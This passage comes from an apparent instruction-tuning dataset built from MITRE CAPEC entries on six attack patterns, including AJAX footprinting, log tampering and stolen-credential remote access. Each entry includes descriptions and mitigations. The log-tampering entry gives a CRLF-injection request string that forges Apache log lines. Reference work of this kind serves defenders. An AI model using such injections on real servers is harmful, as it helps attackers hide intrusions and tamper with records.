    "output": "Examples of AJAX Footprinting (CAPEC ID: 85) are: Footprinting can be executed over almost any protocol including HTTP, TCP, UDP, and ICMP, with the general goal of gaining further information about a host environment to launch further attacks. The attacker can probe the system for banners, vulnerabilities, filenames, available services, and in short anything the host process has access to. The results of the probe are either used to execute javascript (for example, if the attackers' footprint script identifies a vulnerability in a firewall permission, then the client side script executes a javascript to change client firewall settings, or an attacker may simply echo the results of the scan back out to a remote host for targeting future attacks) or to inform other data gathering activities in order to craft atta.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Footprinting can be executed over almost any protocol including HTTP, TCP, UDP, and ICMP, with the general goal of gaining further information about a host environment to launch further attacks. The attacker can probe the system for banners, vulnerabilities, filenames, available services, and in short anything the host process has access to. The results of the probe are either used to execute javascript (for example, if the attackers' footprint script identifies a vulnerability in a firewall permission, then the client side script executes a javascript to change client firewall settings, or an attacker may simply echo the results of the scan back out to a remote host for targeting future attacks) or to inform other data gathering activities in order to craft atta.",
      "@Name": "AJAX Footprinting (CAPEC ID: 85)",
      "attack_ptrn": {
        "@ID": "85",
        "@Name": "AJAX Footprinting",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "This attack utilizes the frequent client-server roundtrips in Ajax conversation to scan a system. While Ajax does not open up new vulnerabilities per se, it does optimize them from an attacker point of view. A common first step for an attacker is to footprint the target environment to understand what attacks will work. Since footprinting relies on enumeration, the conversational pattern of rapid, multiple requests and responses that are typical in Ajax applications enable an attacker to look for many vulnerabilities, well-known ports, network locations and so on. The knowledge gained through Ajax fingerprinting can be used to support other attacks, such as XSS.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "580"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "63"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": {
            "Step": "1",
            "Phase": "Explore",
            "Description": "[Send request to target webpage and analyze HTML] Using a browser or an automated tool, an adversary sends requests to a webpage and records the received HTML response. Adversaries then analyze the HTML to identify any known underlying JavaScript architectures. This can aid in mappiong publicly known vulnerabilities to the webpage and can also helpo the adversary guess application architecture and the inner workings of a system.",
            "Technique": "Record all \"src\" values inside script tags. These JavaScript files are compared to lists of files for known architectures. If there is a large match between the \"src\" values and architecture files, then it can be assumed that particular architecture is being used."
          }
        },
        "Prerequisites": {
          "Prerequisite": "The user must allow JavaScript to execute in their browser"
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "To land and launch a script on victim's machine with appropriate footprinting logic for enumerating services and vulnerabilities in JavaScript"
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Use browser technologies that do not allow client side scripting.",
            "Implementation: Perform input validation for all remote content."
          ]
        },
        "Example_Instances": {
          "Example": "Footprinting can be executed over almost any protocol including HTTP, TCP, UDP, and ICMP, with the general goal of gaining further information about a host environment to launch further attacks. The attacker can probe the system for banners, vulnerabilities, filenames, available services, and in short anything the host process has access to. The results of the probe are either used to execute javascript (for example, if the attackers' footprint script identifies a vulnerability in a firewall permission, then the client side script executes a javascript to change client firewall settings, or an attacker may simply echo the results of the scan back out to a remote host for targeting future attacks) or to inform other data gathering activities in order to craft atta."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "79"
            },
            {
              "@CWE_ID": "113"
            },
            {
              "@CWE_ID": "348"
            },
            {
              "@CWE_ID": "96"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "116"
            },
            {
              "@CWE_ID": "184"
            },
            {
              "@CWE_ID": "86"
            },
            {
              "@CWE_ID": "692"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-539"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description, Example_Instances, Execution_Flow, Mitigations, Related_Attack_Patterns, Resources_Required, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated @Name, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Execution_Flow"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2020-12-17",
            "#text": "AJAX Fingerprinting"
          }
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Documentation Alteration to Circumvent Dial-down (CAPEC ID: 517)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: A product for manufacture exists that contains advanced cryptographic capabilities, including algorithms that are restricted from being shipped to some nations. An attacker from one of the restricted nations alters the documentation to ensure that when the product is manufactured for shipment to a restricted nation, the software compilation steps that normally would prevent the advanced cryptographic capabilities from being included are actually included. When the product is shipped to the attacker's home country, the attacker is able to retrieve and/or use the advanced cryptographic capabilities.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "A product for manufacture exists that contains advanced cryptographic capabilities, including algorithms that are restricted from being shipped to some nations. An attacker from one of the restricted nations alters the documentation to ensure that when the product is manufactured for shipment to a restricted nation, the software compilation steps that normally would prevent the advanced cryptographic capabilities from being included are actually included. When the product is shipped to the attacker's home country, the attacker is able to retrieve and/or use the advanced cryptographic capabilities.",
      "@Name": "Documentation Alteration to Circumvent Dial-down (CAPEC ID: 517)",
      "attack_ptrn": {
        "@ID": "517",
        "@Name": "Documentation Alteration to Circumvent Dial-down",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker with access to a manufacturer's documentation, which include descriptions of advanced technology and/or specific components' criticality, alters the documents to circumvent dial-down functionality requirements. This alteration would change the interpretation of implementation and manufacturing techniques, allowing for advanced technologies to remain in place even though these technologies might be restricted to certain customers, such as nations on the terrorist watch list, giving the attacker on the receiving end of a shipped product access to an advanced technology that might otherwise be restricted.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "447",
            "Exclude_Related": [
              {
                "@Exclude_ID": "513"
              },
              {
                "@Exclude_ID": "515"
              }
            ]
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "Advanced knowledge of internal software and hardware components within manufacturer's development environment.",
            "Access to the manufacturer's documentation."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "High",
              "#text": "Ability to read, interpret, and subsequently alter manufacturer's documentation to prevent dial-down capabilities."
            },
            {
              "@Level": "High",
              "#text": "Ability to stealthly gain access via remote compromise or physical access to the manufacturer's documentation."
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Digitize documents and cryptographically sign them to verify authenticity.",
            "Password protect documents and make them read-only for unauthorized users.",
            "Avoid emailing important documents and configurations.",
            "Ensure deleted files are actually deleted.",
            "Maintain backups of the document for recovery and verification."
          ]
        },
        "Example_Instances": {
          "Example": "A product for manufacture exists that contains advanced cryptographic capabilities, including algorithms that are restricted from being shipped to some nations. An attacker from one of the restricted nations alters the documentation to ensure that when the product is manufactured for shipment to a restricted nation, the software compilation steps that normally would prevent the advanced cryptographic capabilities from being included are actually included. When the product is shipped to the attacker's home country, the attacker is able to retrieve and/or use the advanced cryptographic capabilities."
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-439"
            },
            {
              "@External_Reference_ID": "REF-715"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Mitigations, References"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Retrieve Embedded Sensitive Data (CAPEC ID: 37)",
    "context": "",
    "output": "Possible examples: Using a tool such as 'strings' or similar to pull out text data, perhaps part of a database table, that extends beyond what a particular user's purview should be.\n- An attacker can also use a decompiler to decompile a downloaded Java applet in order to look for information such as hardcoded IP addresses, file paths, passwords or other such contents.\n- Attacker uses a tool such as a browser plug-in to pull cookie or other token information that, from a previous user at the same machine (perhaps a kiosk), allows the attacker to log in as the previous user.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Using a tool such as 'strings' or similar to pull out text data, perhaps part of a database table, that extends beyond what a particular user's purview should be.",
        "An attacker can also use a decompiler to decompile a downloaded Java applet in order to look for information such as hardcoded IP addresses, file paths, passwords or other such contents.",
        "Attacker uses a tool such as a browser plug-in to pull cookie or other token information that, from a previous user at the same machine (perhaps a kiosk), allows the attacker to log in as the previous user."
      ],
      "@Name": "Retrieve Embedded Sensitive Data (CAPEC ID: 37)",
      "attack_ptrn": {
        "@ID": "37",
        "@Name": "Retrieve Embedded Sensitive Data",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker examines a target system to find sensitive data that has been embedded within it. This information can reveal confidential contents, such as account numbers or individual keys/credentials that can be used as an intermediate step in a larger attack.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "167"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify Target] Attacker identifies client components to extract information from. These may be binary executables, class files, shared libraries (e.g., DLLs), configuration files, or other system files.",
              "Technique": [
                "Binary file extraction. The attacker extracts binary files from zips, jars, wars, PDFs or other composite formats.",
                "Package listing. The attacker uses a package manifest provided with the software installer, or the filesystem itself, to identify component files suitable for attack."
              ]
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "[Retrieve Embedded Data] The attacker then uses a variety of techniques, such as sniffing, reverse-engineering, and cryptanalysis to retrieve the information of interest.",
              "Technique": [
                "API Profiling. The attacker monitors the software's use of registry keys or other operating system-provided storage locations that can contain sensitive information.",
                "Execution in simulator. The attacker physically removes mass storage from the system and explores it using a simulator, external system, or other debugging harness.",
                "Common decoding methods. The attacker applies methods to decode such encodings and compressions as Base64, unzip, unrar, RLE decoding, gzip decompression and so on.",
                "Common data typing. The attacker looks for common file signatures for well-known file types (JPEG, TIFF, ASN.1, LDIF, etc.). If the signatures match, they attempt decoding in that format."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "In order to feasibly execute this type of attack, some valuable data must be present in client software.",
            "Additionally, this information must be unprotected, or protected in a flawed fashion, or through a mechanism that fails to resist reverse engineering, statistical, or other attack."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The attacker must possess knowledge of client code structure as well as ability to reverse-engineer or decompile it or probe it in other ways. This knowledge is specific to the technology and language used for the client distribution"
          }
        },
        "Resources_Required": {
          "Resource": "The attacker must possess access to the system or code being exploited. Such access, for this set of attacks, will likely be physical. The attacker will make use of reverse engineering technologies, perhaps for data or to extract functionality from the binary. Such tool use may be as simple as \"Strings\" or a hex editor. Removing functionality may require the use of only a hex editor, or may require aspects of the toolchain used to construct the application: for instance the Adobe Flash development environment. Attacks of this nature do not require network access or undue CPU, memory, or other hardware-based resources."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Example_Instances": {
          "Example": [
            "Using a tool such as 'strings' or similar to pull out text data, perhaps part of a database table, that extends beyond what a particular user's purview should be.",
            "An attacker can also use a decompiler to decompile a downloaded Java applet in order to look for information such as hardcoded IP addresses, file paths, passwords or other such contents.",
            "Attacker uses a tool such as a browser plug-in to pull cookie or other token information that, from a previous user at the same machine (perhaps a kiosk), allows the attacker to log in as the previous user."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "226"
            },
            {
              "@CWE_ID": "311"
            },
            {
              "@CWE_ID": "525"
            },
            {
              "@CWE_ID": "312"
            },
            {
              "@CWE_ID": "314"
            },
            {
              "@CWE_ID": "315"
            },
            {
              "@CWE_ID": "318"
            },
            {
              "@CWE_ID": "1239"
            },
            {
              "@CWE_ID": "1258"
            },
            {
              "@CWE_ID": "1266"
            },
            {
              "@CWE_ID": "1272"
            },
            {
              "@CWE_ID": "1278"
            },
            {
              "@CWE_ID": "1301"
            },
            {
              "@CWE_ID": "1330"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1005",
              "Entry_Name": "Data from Local System"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1552.004",
              "Entry_Name": "Unsecured Credentials: Private Keys"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Activation_Zone, Attack_Phases, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Vulnerabilities, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow, Related_Weaknesses, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-11-09",
            "#text": "Lifting Data Embedded in Client Distributions"
          }
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Remote Services with Stolen Credentials (CAPEC ID: 555)",
    "context": "",
    "output": "Possible examples: Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). There are other implementations and third-party tools that provide graphical access Remote Services similar to RDS. Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials.\n* Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the winrm command or by any number of programs such as PowerShell.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). There are other implementations and third-party tools that provide graphical access Remote Services similar to RDS. Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials.",
        "Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the winrm command or by any number of programs such as PowerShell."
      ],
      "@Name": "Remote Services with Stolen Credentials (CAPEC ID: 555)",
      "attack_ptrn": {
        "@ID": "555",
        "@Name": "Remote Services with Stolen Credentials",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": "This pattern of attack involves an adversary that uses stolen credentials to leverage remote services such as RDP, telnet, SSH, and VNC to log into a system. Once access is gained, any number of malicious activities could be performed.",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "560",
              "Exclude_Related": {
                "@Exclude_ID": "515"
              }
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Disable RDP, telnet, SSH and enable firewall rules to block such traffic. Limit users and accounts that have remote interactive login access. Remove the Local Administrators group from the list of groups allowed to login through RDP. Limit remote user permissions. Use remote desktop gateways and multifactor authentication for remote logins."
        },
        "Example_Instances": {
          "Example": [
            "Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). There are other implementations and third-party tools that provide graphical access Remote Services similar to RDS. Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials.",
            "Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the winrm command or by any number of programs such as PowerShell."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "522"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "309"
            },
            {
              "@CWE_ID": "294"
            },
            {
              "@CWE_ID": "263"
            },
            {
              "@CWE_ID": "262"
            },
            {
              "@CWE_ID": "521"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1021",
              "Entry_Name": "Remote Services"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1114.002",
              "Entry_Name": "Email Collection:Remote Email Collection"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1133",
              "Entry_Name": "External Remote Services"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2015-11-09"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description Summary, Examples-Instances, References, Related_Weaknesses, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated @Abstraction, Related_Attack_Patterns, Related_Weaknesses, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Web Server Logs Tampering (CAPEC ID: 81)",
    "context": "",
    "output": "Possible examples: Most web servers have a public interface, even if the majority of the site is password protected, there is usually at least a login site and brochureware that is publicly available. HTTP requests to the site are also generally logged to a Web log. From an attacker point of view, standard HTTP requests containing a malicious payload can be sent to the public website (with no other access required), when those requests appear in the log (such as http://victimsite/index.html?< malicious script> if they are followed by an administrator this may be sufficient to probe the administrator's host or local network.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Most web servers have a public interface, even if the majority of the site is password protected, there is usually at least a login site and brochureware that is publicly available. HTTP requests to the site are also generally logged to a Web log. From an attacker point of view, standard HTTP requests containing a malicious payload can be sent to the public website (with no other access required), when those requests appear in the log (such as http://victimsite/index.html?< malicious script> if they are followed by an administrator this may be sufficient to probe the administrator's host or local network.",
      "@Name": "Web Server Logs Tampering (CAPEC ID: 81)",
      "attack_ptrn": {
        "@ID": "81",
        "@Name": "Web Server Logs Tampering",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "Web Logs Tampering attacks involve an attacker injecting, deleting or otherwise tampering with the contents of web logs typically for the purposes of masking other malicious behavior. Additionally, writing malicious data to log files may target jobs, filters, reports, and other agents that process the logs in an asynchronous attack pattern. This pattern of attack is similar to \"Log Injection-Tampering-Forging\" except that in this case, the attack is targeting the logs of the web server and not the application.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "268"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine Application Web Server Log File Format] The attacker observes the system and looks for indicators of which logging utility is being used by the web server.",
              "Technique": "Determine logging utility being used by application web server (e.g. log4j), only possible if the application is known by the attacker or if the application returns error messages with logging utility information."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Determine Injectable Content] The attacker launches various logged actions with malicious data to determine what sort of log injection is possible.",
              "Technique": "Attacker triggers logged actions with maliciously crafted data as inputs, parameters, arguments, etc."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Manipulate Log Files] The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted request that the web server will receive and write into the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.",
              "Technique": [
                {
                  "xhtml:p": [
                    "Indirectly through injection, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry.",
                    "For example: The HTTP request for \"/index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] \"GET /forged-path HTTP/1.1\" 200 - \"-\" USER_AGENT\" may add the log line into Apache \"access_log\" (for example). Different applications may require different encodings of the carriage return and line feed characters."
                  ]
                },
                {
                  "xhtml:p": [
                    "Directly through log file or database manipulation, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry.",
                    "For example: The HTTP request for \"/index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] \"GET /forged-path HTTP/1.1\" 200 - \"-\" USER_AGENT\" may add the log line into Apache \"access_log\" (for example). Different applications may require different encodings of the carriage return and line feed characters."
                  ]
                },
                "Directly through log file or database manipulation, modify existing log entries."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Target server software must be a HTTP server that performs web logging."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "To input faked entries into Web logs"
          }
        },
        "Resources_Required": {
          "Resource": "Ability to send specially formatted HTTP request to web server"
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Integrity",
            "Impact": "Modify Data"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Use input validation before writing to web log",
            "Design: Validate all log data before it is output"
          ]
        },
        "Example_Instances": {
          "Example": "Most web servers have a public interface, even if the majority of the site is password protected, there is usually at least a login site and brochureware that is publicly available. HTTP requests to the site are also generally logged to a Web log. From an attacker point of view, standard HTTP requests containing a malicious payload can be sent to the public website (with no other access required), when those requests appear in the log (such as http://victimsite/index.html?< malicious script> if they are followed by an administrator this may be sufficient to probe the administrator's host or local network."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "117"
            },
            {
              "@CWE_ID": "93"
            },
            {
              "@CWE_ID": "75"
            },
            {
              "@CWE_ID": "221"
            },
            {
              "@CWE_ID": "96"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "150"
            },
            {
              "@CWE_ID": "276"
            },
            {
              "@CWE_ID": "279"
            },
            {
              "@CWE_ID": "116"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated @Name"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2022-09-29",
            "#text": "Web Logs Tampering"
          }
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Interface Manipulation (CAPEC ID: 113)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Interface Manipulation (CAPEC ID: 113) are: An adversary may make a request to an application that leverages a non-standard API that is known to incorrectly validate its data and thus it may be manipulated by supplying metacharacters or alternate encodings as input, resulting in any number of injection flaws, including SQL injection, cross-site scripting, or command execution.\nAPI methods not intended for production, such as debugging or testing APIs, may not be disabled when deploying in a production environment. As a result, dangerous functionality can be exposed within the production environment, which an adversary can leverage to execute additional attacks.\nSoC components contain insufficient identifiers, which allows an adversary to reset the device at will or read sensitive data from the device.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "An adversary may make a request to an application that leverages a non-standard API that is known to incorrectly validate its data and thus it may be manipulated by supplying metacharacters or alternate encodings as input, resulting in any number of injection flaws, including SQL injection, cross-site scripting, or command execution.",
        "API methods not intended for production, such as debugging or testing APIs, may not be disabled when deploying in a production environment. As a result, dangerous functionality can be exposed within the production environment, which an adversary can leverage to execute additional attacks.",
        "SoC components contain insufficient identifiers, which allows an adversary to reset the device at will or read sensitive data from the device."
      ],
      "@Name": "Interface Manipulation (CAPEC ID: 113)",
      "attack_ptrn": {
        "@ID": "113",
        "@Name": "Interface Manipulation",
        "@Abstraction": "Meta",
        "@Status": "Draft",
        "Description": "An adversary manipulates the use or processing of an interface (e.g. Application Programming Interface (API) or System-on-Chip (SoC)) resulting in an adverse impact upon the security of the system implementing the interface. This can allow the adversary to bypass access control and/or execute functionality not intended by the interface implementation, possibly compromising the system which integrates the interface. Interface manipulation can take on a number of forms including forcing the unexpected use of an interface or the use of an interface in an unintended way.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Medium",
        "Prerequisites": {
          "Prerequisite": "The target system must expose interface functionality in a manner that can be discovered and manipulated by an adversary. This may require reverse engineering the interface or decrypting/de-obfuscating client-server exchanges."
        },
        "Resources_Required": {
          "Resource": "The requirements vary depending upon the nature of the interface. For example, application-layer APIs related to the processing of the HTTP protocol may require one or more of the following: an Adversary-In-The-Middle (CAPEC-94) proxy, a web browser, or a programming/scripting language."
        },
        "Example_Instances": {
          "Example": [
            "An adversary may make a request to an application that leverages a non-standard API that is known to incorrectly validate its data and thus it may be manipulated by supplying metacharacters or alternate encodings as input, resulting in any number of injection flaws, including SQL injection, cross-site scripting, or command execution.",
            "API methods not intended for production, such as debugging or testing APIs, may not be disabled when deploying in a production environment. As a result, dangerous functionality can be exposed within the production environment, which an adversary can leverage to execute additional attacks.",
            "SoC components contain insufficient identifiers, which allows an adversary to reset the device at will or read sensitive data from the device."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "1192"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Activation_Zone, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
